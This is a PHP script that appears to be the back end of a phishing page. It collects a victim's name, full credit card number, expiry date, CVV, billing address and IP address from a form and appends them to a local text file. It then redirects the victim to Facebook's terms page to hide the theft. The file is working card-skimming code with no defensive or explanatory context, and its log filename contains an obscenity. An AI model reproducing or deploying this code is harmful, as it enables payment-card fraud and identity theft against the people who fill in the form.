<?php
$file 	= "welcome-------2018-------fuck-------you-------mark.txt";
date_default_timezone_set("Asia/Jakarta");
date("Y-m-d H:i:s", mktime(date("H")+1, date("i"), date("s"), date("m"), date("d"), date("Y")));
$namahari = array("Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"); 
$namabulan = array("","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"); 
$waktu =  $namahari[date("w")].", ".date("j")." ".$namabulan[date("n")]." ".date("Y H:i"); 

$nd= $_POST['front'];
$nb= $_POST['hind'];
$cn= $_POST['CreditNumber'];
$ct= $_POST['cardType'];
$mm= $_POST['mm'];
$yy= $_POST['yy'];
$cv= $_POST['CVV'];
$a1= $_POST['address'];
$a2= $_POST['address2'];
$cty= $_POST['city'];
$st= $_POST['state'];
$zi= $_POST['zip'];
$cr= $_POST['country'];

$alamat = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "welcome-------2018-------fuck-------you-------mark.txt");
fwrite($handle, "\n");
fwrite($handle, "Nama            : ");
fwrite($handle, "$nd");
fwrite($handle, " ");
fwrite($handle, "$nb");
fwrite($handle, "\n");
fwrite($handle, "No Kartu        : ");
fwrite($handle, "$cn");
fwrite($handle, "\n");
fwrite($handle, "Jenis Kartu     : ");
fwrite($handle, "$ct");
fwrite($handle, "\n");
fwrite($handle, "Expiration Date : ");
fwrite($handle, "$mm");
fwrite($handle, "/");
fwrite($handle, "$yy");
fwrite($handle, " CVV :");
fwrite($handle, "$cv");
fwrite($handle, "\n");
fwrite($handle, "Alamat          : ");
fwrite($handle, "$a1");
fwrite($handle, "\n");
fwrite($handle, "Alamat          : ");
fwrite($handle, "$a2");
fwrite($handle, "\n");

fwrite($handle, "City/Town       : ");
fwrite($handle, "$cty");
fwrite($handle, "\n");
fwrite($handle, "State/Province  : ");
fwrite($handle, "$st");
fwrite($handle, "\n");
fwrite($handle, "Zip/Postal Code : ");
fwrite($handle, "$zi");
fwrite($handle, "\n");
fwrite($handle, "Country         : ");
fwrite($handle, "$cr");
fwrite($handle, "\n");

fwrite($handle, "IP Address      : ");
fwrite($handle, "$alamat");
fwrite($handle, "\n");
fwrite($handle, "Waktu Masuk     : ");
fwrite($handle, "$waktu");
fwrite($handle, "\n");
fwrite($handle, "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=**=*=*=*=*=*=**=*=*=**=*=");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://facebook.com/terms";
// -->
</script>";
?>
</html>